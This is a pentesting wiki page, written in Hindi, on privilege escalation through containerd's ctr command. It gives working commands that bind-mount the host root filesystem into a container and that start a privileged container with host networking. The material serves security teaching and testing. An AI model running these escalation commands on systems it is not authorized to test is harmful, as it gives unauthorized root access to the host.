# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

यह जानने के लिए निम्नलिखित लिंक पर जाएँ कि **containerd और `ctr` container stack में कहाँ फिट होते हैं**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

यदि आपको पता चलता है कि किसी host में `ctr` command मौजूद है, जो containerd के साथ bundled native CLI है:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
आप containerd को ज्ञात images की सूची बना सकते हैं:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
फिर उन images में से एक को **run** करें, जिसमें host root को container root पर recursively bind-mounted किया गया हो:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

privileged mode में एक container चलाएँ और escape की जाँच करें।\
आप host networking का उपयोग करके privileged container इस प्रकार चला सकते हैं:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` process को caller की effective Linux capabilities प्रदान करता है और कई isolation controls हटा देता है, लेकिन escape अभी भी environment-dependent रहता है; इसके लिए निम्न पेज में बताई गई techniques का उपयोग करके परीक्षण करें:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [containerd के साथ शुरुआत करना](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [`ctr image` command implementation](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [`ctr run` command implementation](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux kernel shared-subtree documentation](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI पैकेज: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd `ctr` command flags](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
